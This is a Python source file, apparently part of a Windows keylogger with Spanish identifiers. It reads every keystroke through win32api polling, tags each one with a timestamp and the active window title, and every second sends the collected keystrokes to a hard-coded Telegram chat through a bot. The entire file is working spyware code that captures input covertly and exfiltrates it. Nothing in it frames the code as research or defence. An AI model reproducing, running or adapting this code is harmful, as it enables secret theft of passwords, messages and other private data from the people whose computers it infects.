import asyncio
from datetime import datetime
import win32api
import win32gui
from helpers import get_key, registro_errores

lista_teclas = []

async def capturar_teclas(bot):
    global lista_teclas
    while True:
        await asyncio.sleep(0.01)
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        mayuscula = win32api.GetKeyState(0x10) & 0x8000 != 0
        alt_gr = (win32api.GetKeyState(0x11) & 0x8000 != 0) and (win32api.GetKeyState(0x12) & 0x8000 != 0)
        timestamp = datetime.now().strftime("[%H-%M-%S]")

        for codigo_tecla in range(256):
            if win32api.GetAsyncKeyState(codigo_tecla) & 1:
                tecla = f"{timestamp} |{window_title.strip()}|  ({get_key(codigo_tecla, mayuscula, alt_gr)})"
                lista_teclas.append(tecla)
                print(f"Key captured: {tecla}")

async def enviar_teclas(bot):
    global lista_teclas
    while True:
        await asyncio.sleep(1)
        if lista_teclas:
            try:
                await bot.send_message(chat_id="817416698", text="\n".join(lista_teclas))
                lista_teclas.clear()
            except Exception as e:
                registro_errores(f"Error sending key presses: {e}")
